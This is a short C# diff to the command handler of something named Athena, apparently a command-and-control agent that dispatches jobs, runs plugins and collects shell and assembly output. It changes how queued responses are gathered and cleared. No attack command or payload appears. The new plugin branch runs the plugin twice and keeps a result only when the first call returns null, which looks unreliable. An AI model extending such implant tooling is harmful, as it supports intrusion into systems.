@@ -196,8 +196,13 @@ namespace Athena.Commands
                     }
                     break;
                 default:
-                    this.responseResults.Add(await CheckAndRunPlugin(job));
-                    this.activeJobs.Remove(task.id, out _);
+                    ResponseResult rr = (ResponseResult)await CheckAndRunPlugin(job);
+                    
+                    if(rr is null)
+                    {
+                        this.responseResults.Add(await CheckAndRunPlugin(job));
+                        this.activeJobs.Remove(task.id, out _);
+                    }
                     break;
             }
 #if WINBUILD
@@ -275,6 +280,8 @@ namespace Athena.Commands
         public async Task<List<object>> GetResponses()
         {
             List<object> responses = this.responseResults.ToList<object>();
+            this.responseResults.Clear();
+
             if (this.assemblyHandler.assemblyIsRunning)
             {
                 responses.Add(await this.assemblyHandler.GetAssemblyOutput());
@@ -285,7 +292,7 @@ namespace Athena.Commands
                 responses.AddRange(await this.shellHandler.GetOutput());
             }
 
-            this.responseResults.Clear();
+            responses.AddRange(await PluginHandler.GetResponses());
             return responses;
         }
         /// <summary>
